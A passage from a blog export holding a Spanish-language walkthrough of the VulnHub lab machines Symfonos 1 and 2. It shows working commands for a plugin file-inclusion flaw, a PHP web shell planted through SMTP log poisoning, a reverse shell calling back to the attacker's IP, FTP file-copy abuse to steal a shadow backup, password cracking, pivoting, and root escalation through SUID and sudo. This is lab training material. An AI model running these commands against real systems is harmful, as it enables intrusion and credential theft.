configuration file for the Samba suite for Debian GNU/Linux.\n#\n#\n# This is the main Samba configuration file. You should read the\n# smb.conf(5) manual page in order to understand the options listed\n# here. Samba has a huge number of configurable options most of which \n# are not shown in this example\n...\n[anonymous]\n 258   │    path = /home/aeolus/share\n 259   │    browseable = yes\n 260   │    read only = yes\n 261   │    guest ok = yes\n...\nUser\t\t\t\taeolus\nGroup\t\t\t\taeolus\n...\n</code></pre><ul><li>Existe una copia del <em>shadow </em>en <em>/var/backups/shadow.bak</em>.</li><li>Existe el usuario <strong>aeolus</strong></li><li>El path <em>/home/aeolus/share</em> es visible de forma anónima por samba. Probablemente, ese sea el directorio donde estamos encontrando el archivo, este que acabamos de leer.</li></ul><p>A través de <strong>smb </strong>no se puede hacer nada más.</p><p>Continuamos por <strong>FTP </strong>en el puerto 21.</p><h2 id=\"proftpd-135-exploit\">ProFTPD 1.3.5 exploit</h2><p><strong>Searchsploit </strong>nos arroja información sobre esta versión de <strong>ftp</strong>. Parece ser vulnerable</p><pre><code class=\"language-bash\">searchsploit proftp 1.3.5\n# ProFTPd 1.3.5 - File Copy                                    | linux/remote/36742.txt\nsearchsploit -x linux/remote/36742.txt\n# Description TJ Saunders 2015-04-07 16:35:03 UTC\n# Vadim Melihow reported a critical issue with proftpd installations that use the\n# mod_copy module's SITE CPFR/SITE CPTO commands; mod_copy allows these commands to be used by *unauthenticated clients*:\n</code></pre><p>Podemos copiar y pegar archivos de forma remota. Teniendo en cuenta que por <strong>SMB </strong>somos capaces de leer el directorio <em>/home/aeolus/share</em>, podemos aprovechar esto para copiar ahí el backup del archivo<em> /etc/shadow</em>.</p><pre><code class=\"language-bash\">proxychains ftp 10.10.10.3\nName (10.10.10.3:iocio): \n# 331 Password required for iocio\nPassword:\n# 530 Login incorrect.\n# Login failed.\n# Remote system type is UNIX.\n# Using binary mode to transfer files.\nftp&gt; site CPFR /var/backups/shadow.bak\n# 350 File or directory exists, ready for destination name\nftp&gt; site CPTO /home/aeolus/share/shadow\n# 250 Copy successful\nquit\n</code></pre><p>Ya estamos listos para descargarnos el archivo con <strong>smb</strong>.</p><pre><code class=\"language-bash\">proxychains smbmap -H 10.10.10.3 --download anonymous/shadow\n</code></pre><p>Vamos a probar con un poco de fuerza bruta, a ver si somos capaces de descifrar los hashes.</p><h2 id=\"johntheripper-shadow\">JohnTheRipper &gt; Shadow</h2><pre><code class=\"language-bash\">john --wordlist=/usr/share/wordlists/rockyou.txt shadow\njohn --show shadow\n# aeolus:sergioteamo:18095:0:99999:7:::\n</code></pre><p>Parece que tenemos la contraseña del usuario <code>aeolus</code>, <code>sergioteamo</code>.</p><pre><code class=\"language-bash\">proxychains ssh aeolus@10.10.10.3\naeolus@symfonos2:~$ whoami\n# aeolus\naeolus@symfonos2:~$ hostname -I\n# 10.10.10.3\n</code></pre><p>Estamos dentro de la máquina <strong>Symfonos 2</strong>.</p><h2 id=\"symfonos-2-escalado\">Symfonos 2: Escalado</h2><p>Con el comando <code>ss</code>, buscamos conexiones de red expuestas.</p><pre><code class=\"language-bash\">ss -tulpn\n# Netid  State      Recv-Q Send-Q                                   Local Address:Port\n# ...\n# tcp    LISTEN     0      128                                         127.0.0.1:8080\n# ...\n</code></pre><p>Parece ser que hay algo expuesto en el puerto 8080 del <em>localhost </em>de la máquina <strong>Symfonos 2</strong>.<br>Para poder acceder a ella, necesitamos redireccionar en nuestro equipo dicho puerto mediante un túnel <strong>SSH</strong>.</p><p>Con el siguiente comando vamos a ello.</p><pre><code class=\"language-bash\">proxychains ssh -L 8080:127.0.0.1:8080 aeolus@10.10.10.3\n</code></pre><p>Una vez hecho esto, abrimos <strong>firefox </strong>y accedemos a <a href=\"http://localhost:8080\"><em>http://localhost:8080</em></a>.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2023/01/LibreNMS.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"662\" height=\"430\" srcset=\"__GHOST_URL__/content/images/size/w600/2023/01/LibreNMS.png 600w, __GHOST_URL__/content/images/2023/01/LibreNMS.png 662w\"></figure><p>Dado que tenemos las credenciales del usuario <strong>aeolus</strong>, vamos a ver si podemos reutilizarlas en esta ventana de login.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2023/01/LibreNMS-Logged.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"629\" height=\"348\" srcset=\"__GHOST_URL__/content/images/size/w600/2023/01/LibreNMS-Logged.png 600w, __GHOST_URL__/content/images/2023/01/LibreNMS-Logged.png 629w\"></figure><p>Una vez dentro, buscamos alguna vulnerabilidad en este <strong>CMS</strong>.</p><pre><code class=\"language-bash\">searchsploit librenms\n# LibreNMS 1.46 - 'addhost' Remote Code Execution                  php/webapps/47044.py\n</code></pre><p>El script genera un <strong>RCE </strong>por SNMP cuando crea un dispositivo. Con ayuda de él y poniéndonos en escucha desde<strong> Symfonos 1</strong>.</p><pre><code class=\"language-bash\">$ whoami\n# cronus\n</code></pre><p>Pero vamos a complicarlo un poco más. Vamos a entablar una reverse shell hacia mi máquina atacante. Para ello, haremos uso de Socat.</p><p>Desde <strong>Symfonos 1</strong>, ejecutamos el siguiente comando.</p><pre><code class=\"language-bash\">socat TCP-LISTEN:4646,fork TCP:192.168.1.138:4646\n</code></pre><p>De esta manera, lo que haremos desde <strong>Symfonos 1</strong>, es que todo el tráfico que le llegue por el puerto 4646, lo redirigirá automáticamente al host <em>192.168.1.138</em>, que es el de mi máquina atacante.</p><pre><code class=\"language-bash\">nc -lvnp 4646\n# listening on [any] 4646 ...\n# connect to [192.168.1.138] from (UNKNOWN) [192.168.1.140] 54208\n# /bin/sh: 0: can't access tty; job control turned off\n$ whoami\ncronus\n</code></pre><p>Adecuamos la TTY con un <a href=\"https://ironhackers.es/tutoriales/como-conseguir-tty-totalmente-interactiva/\">tratamiento </a>para poder utilizar el Ctrl+C, Ctrl+L y las flechas durante la sesión de la shell.</p><p>Aún queda ganar privilegios de root. Buscamos si tenemos permisos en la configuración de sudoers.</p><pre><code class=\"language-bash\">sudo -l\n# Matching Defaults entries for cronus on symfonos2:\n#     env_reset, mail_badpass,\n#     secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n# User cronus may run the following commands on symfonos2:\n#     (root) NOPASSWD: /usr/bin/mysql\n</code></pre><p>Cuando encontramos este tipo de permisos, conviene visitar <a href=\"https://gtfobins.github.io/gtfobins/mysql/#sudo\">https://gtfobins.github.io/</a> a ver si, de alguna manera, podemos acceder a la consola de root directamente.</p><p>En este caso, con el siguiente comando ejecutándolo como sudo, parece suficiente.</p><pre><code class=\"language-bash\">sudo mysql -e '\\! /bin/sh'\ncronus@symfonos2:/$ sudo mysql -e '\\! /bin/sh'\nwhoami\n# root\ncat /root/proof.txt\n\n\tCongrats on rooting symfonos:2!\n\n           ,   ,\n         ,-`{-`/\n      ,-~ , \\ {-~~-,\n    ,~  ,   ,`,-~~-,`,\n  ,`   ,   { {      } }                                             }/\n ;     ,--/`\\ \\    / /                                     }/      /,/\n;  ,-./      \\ \\  { {  (                                  /,;    ,/ ,/\n; /   `       } } `, `-`-.___                            / `,  ,/  `,/\n \\|         ,`,`    `~.___,---}                         / ,`,,/  ,`,;\n  `        { {                                     __  /  ,`/   ,`,;\n        /   \\ \\                                 _,`, `{  `,{   `,`;`\n       {     } }       /~\\         .-:::-.     (--,   ;\\ `,}  `,`;\n       \\\\._./ /      /` , \\      ,:::::::::,     `~;   \\},/  `,`;     ,-=-\n        `-..-`      /. `  .\\_   ;:::::::::::;  __,{     `/  `,`;     {\n                   / , ~ . ^ `~`\\:::::::::::&lt;&lt;~&gt;-,,`,    `-,  ``,_    }\n                /~~ . `  . ~  , .`~~\\:::::::;    _-~  ;__,        `,-`\n       /`\\    /~,  . ~ , '  `  ,  .` \\::::;`   &lt;&lt;&lt;~```   ``-,,__   ;\n      /` .`\\ /` .  ^  ,  ~  ,  . ` . ~\\~                       \\\\, `,__\n     / ` , ,`\\.  ` ~  ,  ^ ,  `  ~ . . ``~~~`,                   `-`--, \\\n    / , ~ . ~ \\ , ` .  ^  `  , . ^   .   , ` .`-,___,---,__            ``\n  /` ` . ~ . ` `\\ `  ~  ,  .  ,  `  ,  . ~  ^  ,  .  ~  , .`~---,___\n/` . `  ,  . ~ , \\  `  ~  ,  .  ^  ,  ~  .  `  ,  ~  .  ^  ,  ~  .  `-,\n\n\tContact me via Twitter @zayotic to give feedback!\n</code></pre>",
            "comment_id": "63c345ee39046b006481bee9",
            "plaintext": "Máquinas easy y medium, donde aprovechamos la técnica del pivoting para saltar entre ellas y llegar a la prueba final. Enumeramos mucho, nos aprovechamos de smbmap, un plugin de mail de Wordpress, Log Poisoning, Path Hijacking, vulnerabilidad de FTP, BruteForce del archivo shadow, LibreNMS vulnerable y posibilidad de ejecutar MySQL como sudo.\n\n\nSymfonos 1\n\n\nPrimeros pasos\n\nEn este caso, desconocemos la IP de la máquina. Lo primero que vamos a hacer es recoger los host visibles desde mi equipo cacheados en la tabla ARP. Una alternativa sería utilizar ArpScan.\n\ncat /proc/net/arp\n# IP address       HW type     Flags       HW address            Mask     Device\n# 192.168.1.140    0x1         0x2         08:00:27:5a:60:b1     *        enp0s3\n# 192.168.1.137    0x1         0x0         00:00:00:00:00:00     *        enp0s3\n\n\nLa IP 192.168.1.140 es nuestro objetivo ahora.\n\nCon un ping, obtenemos el TTL para saber si se refiere a una máquina Linux o una Windows.\n\nping -c 1 192.168.1.140 -R\n# PING 192.168.1.140 (192.168.1.140) 56(124) bytes of data.\n# 64 bytes from 192.168.1.140: icmp_seq=1 ttl=64 time=0.420 ms\n# RR: \t192.168.1.138\n# \t    192.168.1.140\n# \t    192.168.1.140\n#\t    192.168.1.138\n\n\n⚠️TTL~64 -> Linux\n\n\nReconocimiento\n\nMediante nmap escaneamos los puertos abiertos.\n\nnmap -p- -sS -vvv --open -n -Pn --min-rate 5000 192.168.1.140 -oG allPorts\n# Open ports: 22,25,80,139,445\n\n\nAfinamos la búsqueda una vez conocidos los puertos abiertos.\n\nnmap -p22,25,80,139,445 -sCV 192.168.1.140 -oN targeted\n\n\nY vemos el archivo targeted para mirar un poco el resultado.\n\n# Nmap 7.92 scan initiated Sat Jan 14 11:57:45 2023 as: nmap -p22,25,80,139,445 -sCV -oN targeted 192.168.1.140\nNmap scan report for symfonos.local (192.168.1.140)\nHost is up (0.00047s latency).\nPORT    STATE SERVICE     VERSION\n22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)\n...\n25/tcp  open  smtp        Postfix smtpd\n...\n80/tcp  open  http        Apache httpd 2.4.25 ((Debian))\n...\n139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)\nMAC Address: 08:00:27:5A:60:B1 (Oracle VirtualBox virtual NIC)\n...\n\n\nHe omitido el output para quedarme con lo interesante. Servicios de ssh, smtp, http y smb expuestos.\n\nMediante smbmap, intentamos obtener acceso a los recursos compartidos a ver si está todo bien configurado.\n\nsmbmap -H 192.168.1.140\n# [+] Guest session   \tIP: 192.168.1.140:445\tName: symfonos.local                                    \n#         Disk                                           \tPermissions\tComment\n#         ----                                             \t-----------\t-------\n# \t\tprint$                                            \tNO ACCESS\tPrinter Drivers\n# \t\thelios                                            \tNO ACCESS\tHelios personal share\n#    \tanonymous                                         \tREAD ONLY\t\n#     \tIPC$                                              \tNO ACCESS\tIPC Service\nsmbmap -H 192.168.1.140 -r anonymous\n# [+] Guest session   \tIP: 192.168.1.140:445\tName: symfonos.local                                    \n#\tanonymous                                         \tREAD ONLY\t\n#\t.\\anonymous\\*\n#\tdr--r--r--                0 Sat Jun 29 03:14:49 2019\t.\n#\tdr--r--r--                0 Sat Jun 29 03:12:15 2019\t..\n#\tfr--r--r--              154 Sat Jun 29 03:14:49 2019\tattention.txt\nsmbmap -H 192.168.1.140 --download anonymous/attention.txt\n# [+] Starting download: anonymous\\attention.txt (154 bytes)\n# [+] File output to: /home/iocio/Desktop/VulnHub/Symfonos1/content/192.168.1.140-anonymous_attention.txt\n\n\nSi cateamos el archivo de texto obtenemos lo siguiente.\n\nCan users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! \n\nNext person I find using one of these passwords will be fired!\n\n-Zeus\n\n\nCosas interesantes hasta aquí, de atrás adelante.\n\n * Las contraseñas 'epidioko', 'qwerty' y 'baseball' son contraseñas que debería tener en cuenta para continuar con el reto.\n * Por otro lado, hay un recurso compartido llamado 'helios' -> 'Helios personal', que me puede hacer pensar que hay un usuario llamado helios.\n   Vamos a intentar loguearnos a smb con el usuario 'helios' y cualquiera de esas 3 contraseñas.\n\nsmbmap -H 192.168.1.140 -u helios -p qwerty\n# [+] IP: 192.168.1.140:445\tName: symfonos.local                                    \n#        Disk                                                  \tPermissions\tComment\n#     \t----                                                  \t-----------\t-------\n#   \tprint$                                            \tREAD ONLY\tPrinter Drivers\n#   \thelios                                            \tREAD ONLY\tHelios personal #   \tanonymous                                         \tREAD ONLY\t\n#   \tIPC$                                              \tNO ACCESS\tIPC Service\n\n\nTirando del hilo como anteriormente, he encontrado dos archivos. Un research.txt y un todo.txt.\nEl texto de todo.txt es el siguiente.\n\n1. Binge watch Dexter\n2. Dance\n3. Work on /h3l105\n\n\nEl tercer punto parece un directorio o una ruta. Si accedo por Firefox a la web expuesta y pongo esa ruta, vemos un servidor Wordpress. Coloco la siguiente entrada en /etc/hosts para que los archivos estáticos se descarguen correctamente y poderlo visualizar correctamente.\n\n192.168.1.140    symfonos.local\n\n\nA partir de aquí podríamos utilizar WpScan, pero vamos a intentar enumerar posibles plugins que pueda tener instalados y buscar vulnerabilidades en ellos.\n\nCon la salida de curl, concatenando varios greps y algunos delimitadores, obtenemos la siguiente entrada:\n\ncurl -X get 192.168.1.140/h3l105/ | grep 'wp-content' | grep -oP \"'.*?'\" | grep symfonos.local | cut -d '/' -f 1-7 | sort -u | grep plugins\n# 'http://symfonos.local/h3l105/wp-content/plugins/mail-masta\n# 'http://symfonos.local/h3l105/wp-content/plugins/site-editor\n\n\nHay un plugin de mails y otro bastante común para la edición del sitio. Recordamos que la máquina tiene expuesto el puerto de 25 SMTP. Vamos a ir por ese camino.\n\nBuscamos vulnerabilidades en searchsploit.\n\nsearchsploit mail masta\n# WordPress Plugin Mail Masta 1.0 - Local File Inclusion (2)                                                                                                  | php/webapps/50226.py\n\n\nEl plugin Mail Masta tiene una vulnerabilidad de tipo LFI.\nMirando el script, vemos que la vulnerabilidad se encuentra en una URL. Vamos a probarlo manualmente con curl.\n\ncurl -X GET \"http://192.168.1.140/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd\"\n# root:x:0:0:root:/root:/bin/bash\n# helios:x:1000:1000:,,,:/home/helios:/bin/bash \n\n\nPodemos desarrollar un script para hacer más sencillas las consultas como [[lfi_read_file.sh]]\nUn directorio interesante continuando con el tema de smtp, es /var/mail/<username>.\nCon ayuda del script, vemos dicho archivo.\n\n./lfi_read_file.sh -f /var/mail/helios\n\n\n\nLog Poisoning de SMTP\n\nEl directorio /var/mail/helios está expuesto. Si fuésemos capaces de enviar un mail y colar código PHP en él, podríamos mediante el LFI transformarlo en un RCE fácilmente.\n\nVamos a conectarnos por telnet al puerto del mail y tratar de enviar algo.\n\ntelnet 192.168.1.140 25\n# Connected to 192.168.1.140.\n# Escape character is '^]'.\n# 220 symfonos.localdomain ESMTP Postfix (Debian/GNU)\nMAIL FROM: 0x10\n# 250 2.1.0 Ok\nRCPT TO: helios\n# 250 2.1.5 Ok\nDATA\n# 354 End data with <CR><LF>.<CR><LF>\n<?php system($_GET['cmd']) ?>\n.\n# 250 2.0.0 Ok: queued as 9ACCB4083E\nquit\n\n\nDe este modo, vamos a entablarnos una reverse shell.\n\n# attacker\nsudo nc -lvnp 443\nlistening on [any] 443 ...\n\n\n# vulnerable machine\ncurl -vs -X GET \"http://192.168.1.140/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=%2Fbin%2Fbash+-c+%22sh+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.1.138%2F443+0%3E%261%22\"\n\n\n# attacker\n# sudo nc -lvnp 443\n# listening on [any] 443 ...\nconnect to [192.168.1.138] from (UNKNOWN) [192.168.1.140] 54028\nsh: 0: can't access tty; job control turned off\n$ whoami\nhelios\n\n\n\nSymfonos 1: Escalado\n\nBuscamos archivos SUID que permitan ejecutar código con permisos root.\n\nfind \\-perm -4000 2>/dev/null\n# ./usr/lib/eject/dmcrypt-get-device\n# ./usr/lib/dbus-1.0/dbus-daemon-launch-helper\n# ./usr/lib/openssh/ssh-keysign\n# ./usr/bin/passwd\n# ./usr/bin/gpasswd\n# ./usr/bin/newgrp\n# ./usr/bin/chsh\n# ./usr/bin/chfn\n# ./opt/statuscheck\n# ./bin/mount\n# ./bin/umount\n# ./bin/bash\n# ./bin/su\n# ./bin/ping\n\n\nLlama la atención el archivo /opt/statuscheck. Vamos a inspeccionarlo más\n\nstrings /opt/statuscheck\n# ...\n# _ITM_registerTMCloneTable\n# GLIBC_2.2.5\n# curl -I H\n# http://lH\n# ocalhostH\n# AWAVA\n# AUATL\n# ...\n\n\nHace uso del comando curl de forma relativa. Vamos a aplicar Path Hijacking.\n\n\nPath Hijacking\n\nCreamos un archivo en la carpeta /tmp llamado curl, hacemos que ejecute el siguiente comando para darle privilegios SUID a /bin/bash.\n\nchmod u+s /bin/bash\n\n\nAñadimos /tmp dentro de la variable $PATH asignándole prioridad.\n\nexport PATH=/tmp:$PATH\n\n\nY ejecutamos el archivo statuscheck. Posteriormente, llamamos a /bin/bash con -p para lanzarlo con modo privilegiado.\n\nsudo /opt/statuscheck\n/bin/bash -p\nwhoami\n# root\n\n\nVamos a enumerar las interfaces que tiene activas.\n\nhostname -I\n10.10.10.4 192.168.1.140\n\n\nLa interfaz 10.10.10.4 era desconocida hasta ahora. Vamos a mirar su tabla ARP.\n\ncat /proc/net/arp\nash-4.4# cat /proc/net/arp\nIP address       HW type     Flags       HW address            Mask     Device\n10.10.10.3       0x1         0x2         08:00:27:44:fe:76     *        enp0s8\n192.168.1.138    0x1         0x2         08:00:27:40:1b:d1     *        enp0s17\n192.168.1.1      0x1         0x2         b0:8b:92:fa:45:dc     *        enp0s17\n192.168.1.136    0x1         0x2         68:b6:91:4e:42:0c     *        enp0s17\n\n\nAhí está el host 10.10.10.3 correspondiente a Symfonos 2. A partir de aquí podríamos enumerar los host y puertos con un script, pero vamos a continuar directamente con la máquina Symfonos 2.\n\n\nSymfonos 2\n\nEl procedimiento a continuación es entablar una comunicación desde nuestro equipo atacante, a la red 10.10.10.0/24 pasando por la máquina Symfonos 1.\n\n\nEntablamos la comunicación\n\nNos descargamos Chisel desde su Github con wget, y lo compartimos con Symfonos 1.\n\nwget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz\ngunzip chisel_1.7.7_linux_amd64.gz\nmv chisel_1.7.7_linux_amd64 chisel\npython -m http.server 8080\n\n\nY lo compartimos con Symfonos 1.\n\nwget 192.168.1.138:8080/chisel\n\n\nArrancamos chisel en modo servidor en nuestra máquina atacante.\n\nchisel server --reverse -p 1234\n\n\nY desde Symfonos 1, entablamos la comunicación con Socks5.\n\nchisel client 192.168.1.138:1234 R:socks\n# When connection is stablished, chisel server output\n# 2023/01/13 23:32:12 server: session#3: tun: proxy#R:127.0.0.1:1080=>socks: Listening\n\n\nPor último, en nuestra máquina atacante, debemos configurar Proxychains para que sea capaz de tunelizar las peticiones a través de Symfonos 1.\n\nnano /etc/proxychains.conf\n#[ProxyList]\n# add proxy here ...\n# meanwile\n# defaults set to \"tor\"\n#socks4     127.0.0.1 9050\nsocks5 127.0.0.1 1080 # this port depends on Chisel result\n\n\n\nEnumeración de Symfonos 2\n\nEjecutamos nmap como al inicio, wrappeando la comunicación a través de Proxychains.\n\nproxychains nmap --top-ports 50 -sT -vvv --open -n -Pn --min-rate 5000 10.10.10.3 -oG allPorts 2>&1 | grep -vE \"timeout|OK\"\n\n\n⚠️Recuerda que con Proxychains, no se puede utilizar la opción -sS porque entra en conflicto con el túnel. Hay que cambiar el parámetro a -sT para utilizar peticiones TCP normales.\n\nSe concatenan además unos comandos de limpieza porque Proxychains imprime más contenido del deseado. Los puertos abiertos son los siguientes: 21, 22, 80, 139, 445.\n\nAfinamos la búsqueda.\n\nproxychains nmap -p21,22,80,139,445 --open -T5 -v -n -sTV -Pn 10.10.10.3 -oN targeted 2>&1 | grep -vE \"OK\"\n# PORT    STATE SERVICE     VERSION\n# 21/tcp  open  ftp         ProFTPD 1.3.5\n# 22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)\n# 80/tcp  open  http        WebFS httpd 1.21\n# 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n# 445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n# Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\n\nSi nos comunicamos con Samba, vemos de nuevo que el acceso anónimo está permitido y nos encontramos un archivo log.txt que parece interesante.\n\nproxychains smbmap -H 10.10.10.3 --download anonymous/backups/log.txt\n\n\nSi lo examinamos, nos encontramos con lo siguiente (se han omitido cosas que no eran interesantes).\n\nroot@symfonos2:~# cat /etc/shadow > /var/backups/shadow.bak\nroot@symfonos2:~# cat /etc/samba/smb.conf\n#\n# Sample configuration file for the Samba suite for Debian GNU/Linux.\n#\n#\n# This is the main Samba configuration file. You should read the\n# smb.conf(5) manual page in order to understand the options listed\n# here. Samba has a huge number of configurable options most of which \n# are not shown in this example\n...\n[anonymous]\n 258   │    path = /home/aeolus/share\n 259   │    browseable = yes\n 260   │    read only = yes\n 261   │    guest ok = yes\n...\nUser\t\t\t\taeolus\nGroup\t\t\t\taeolus\n...\n\n\n * Existe una copia del shadow en /var/backups/shadow.bak.\n * Existe el usuario aeolus\n * El path /home/aeolus/share es visible de forma anónima por samba. Probablemente, ese sea el directorio donde estamos encontrando el archivo, este que acabamos de leer.\n\nA través de smb no se puede hacer nada más.\n\nContinuamos por FTP en el puerto 21.\n\n\nProFTPD 1.3.5 exploit\n\nSearchsploit nos arroja información sobre esta versión de ftp. Parece ser vulnerable\n\nsearchsploit proftp 1.3.5\n# ProFTPd 1.3.5 - File Copy                                    | linux/remote/36742.txt\nsearchsploit -x linux/remote/36742.txt\n# Description TJ Saunders 2015-04-07 16:35:03 UTC\n# Vadim Melihow reported a critical issue with proftpd installations that use the\n# mod_copy module's SITE CPFR/SITE CPTO commands; mod_copy allows these commands to be used by *unauthenticated clients*:\n\n\nPodemos copiar y pegar archivos de forma remota. Teniendo en cuenta que por SMB somos capaces de leer el directorio /home/aeolus/share, podemos aprovechar esto para copiar ahí el backup del archivo /etc/shadow.\n\nproxychains ftp 10.10.10.3\nName (10.10.10.3:iocio): \n# 331 Password required for iocio\nPassword:\n# 530 Login incorrect.\n# Login failed.\n# Remote system type is UNIX.\n# Using binary mode to transfer files.\nftp> site CPFR /var/backups/shadow.bak\n# 350 File or directory exists, ready for destination name\nftp> site CPTO /home/aeolus/share/shadow\n# 250 Copy successful\nquit\n\n\nYa estamos listos para descargarnos el archivo con smb.\n\nproxychains smbmap -H 10.10.10.3 --download anonymous/shadow\n\n\nVamos a probar con un poco de fuerza bruta, a ver si somos capaces de descifrar los hashes.\n\n\nJohnTheRipper > Shadow\n\njohn --wordlist=/usr/share/wordlists/rockyou.txt shadow\njohn --show shadow\n# aeolus:sergioteamo:18095:0:99999:7:::\n\n\nParece que tenemos la contraseña del usuario aeolus, sergioteamo.\n\nproxychains ssh aeolus@10.10.10.3\naeolus@symfonos2:~$ whoami\n# aeolus\naeolus@symfonos2:~$ hostname -I\n# 10.10.10.3\n\n\nEstamos dentro de la máquina Symfonos 2.\n\n\nSymfonos 2: Escalado\n\nCon el comando ss, buscamos conexiones de red expuestas.\n\nss -tulpn\n# Netid  State      Recv-Q Send-Q                                   Local Address:Port\n# ...\n# tcp    LISTEN     0      128                                         127.0.0.1:8080\n# ...\n\n\nParece ser que hay algo expuesto en el puerto 8080 del localhost de la máquina Symfonos 2.\nPara poder acceder a ella, necesitamos redireccionar en nuestro equipo dicho puerto mediante un túnel SSH.\n\nCon el siguiente comando vamos a ello.\n\nproxychains ssh -L 8080:127.0.0.1:8080 aeolus@10.10.10.3\n\n\nUna vez hecho esto, abrimos firefox y accedemos a http://localhost:8080.\n\nDado que tenemos las credenciales del usuario aeolus, vamos a ver si podemos reutilizarlas en esta ventana de login.\n\nUna vez dentro, buscamos alguna vulnerabilidad en este CMS.\n\nsearchsploit librenms\n# LibreNMS 1.46 - 'addhost' Remote Code Execution                  php/webapps/47044.py\n\n\nEl script genera un RCE por SNMP cuando crea un dispositivo. Con ayuda de él y poniéndonos en escucha desde Symfonos 1.\n\n$ whoami\n# cronus\n\n\nPero vamos a complicarlo un poco más. Vamos a entablar una reverse shell hacia mi máquina atacante. Para ello, haremos uso de Socat.\n\nDesde Symfonos 1, ejecutamos el siguiente comando.\n\nsocat TCP-LISTEN:4646,fork TCP:192.168.1.138:4646\n\n\nDe esta manera, lo que haremos desde Symfonos 1, es que todo el tráfico que le llegue por el puerto 4646, lo redirigirá automáticamente al host 192.168.1.138, que es el de mi máquina atacante.\n\nnc -lvnp 4646\n# listening on [any] 4646 ...\n# connect to [192.168.1.138] from (UNKNOWN) [192.168.1.140] 54208\n# /bin/sh: 0: can't access tty; job control turned off\n$ whoami\ncronus\n\n\nAdecuamos la TTY con un tratamiento para poder utilizar el Ctrl+C, Ctrl+L y las flechas durante la sesión de la shell.\n\nAún queda ganar privilegios de root. Buscamos si tenemos permisos en la configuración de sudoers.\n\nsudo -l\n# Matching Defaults entries for cronus on symfonos2:\n#     env_reset, mail_badpass,\n#     secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n# User cronus may run the following commands on symfonos2:\n#     (root) NOPASSWD: /usr/bin/mysql\n\n\nCuando encontramos este tipo de permisos, conviene visitar https://gtfobins.github.io/ a ver si, de alguna manera, podemos acceder a la consola de root directamente.\n\nEn este caso, con el siguiente comando ejecutándolo como sudo, parece suficiente.\n\nsudo mysql -e '\\! /bin/sh'\ncronus@symfonos2:/$ sudo mysql -e '\\! /bin/sh'\nwhoami\n# root\ncat /root/proof.txt\n\n\tCongrats on rooting symfonos:2!\n\n           ,   ,\n         ,-`{-`/\n      ,-~ , \\ {-~~-,\n    ,~  ,   ,`,-~~-,`,\n  ,`   ,   { {      } }                                             }/\n ;     ,--/`\\ \\    / /                                     }/      /,/\n;  ,-./      \\ \\  { {  (                                  /,;    ,/ ,/\n; /   `       } } `, `-`-.___                            / `,  ,/  `,/\n \\|         ,`,`    `~.___,---}                         / ,`,,/  ,`,;\n  `        { {                                     __  /  ,`/   ,`,;\n        /   \\ \\                                 _,`, `{  `,{   `,`;`\n       {     } }       /~\\         .-:::-.     (--,   ;\\ `,}  `,`;\n       \\\\._./ /      /` , \\      ,:::::::::,     `~;   \\},/  `,`;     ,-=-\n        `-..-`      /. `  .\\_   ;:::::::::::;  __,{     `/  `,`;     {\n                   / , ~ . ^ `~`\\:::::::::::<<~>-,,`,    `-,  ``,_    }\n                /~~ . `  . ~  , .`~~\\:::::::;    _-~  ;__,        `,-`\n       /`\\    /~,  . ~ , '  `  ,  .` \\::::;`   <<<~```   ``-,,__   ;\n      /` .`\\ /` .  ^  ,  ~  ,  . ` . ~\\~                       \\\\, `,__\n     / ` , ,`\\.  ` ~  ,  ^ ,  `  ~ . . ``~~~`,                   `-`--, \\\n    / , ~ . ~ \\ , ` .  ^  `  , . ^   .   , ` .`-,___,---,__            ``\n  /` ` . ~ . ` `\\ `  ~  ,  .  ,  `  ,  . ~  ^  ,  .  ~  , .`~---,___\n/` . `  ,  . ~ , \\  `  ~  ,  .  ^  ,  ~  .  `  ,  ~  .  ^  ,  ~  .  `-,\n\n\tContact me via Twitter @zayotic to give feedback!\n",
            "feature_image": "__GHOST_URL__/content/images/2023/01/Symfonos-1.png",
            "featured": 0,
            "type": "post",
            "status": "published",
            "locale": null,
            "visibility": "public",
            "email_recipient_filter": "all",
            "created_at": "2023-01-15T00:16:46.000Z",
            "updated_at": "2023-01-15T00:38:18.000Z",
            "published_at": "2023-01-15T00:38:18.000Z",
            "custom_excerpt": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "custom_template": null,
            "canonical_url": null,
            "newsletter_id": null
          },
          {
            "id": "63c356e839046b006481bfb3",
            "uuid": "c16844a4-619e-473f-a6eb-7b9cee15e408",
            "title": "¿Por qué deberías proteger Node-RED?",
            "slug": "por-que-deberias-proteger-node-red",
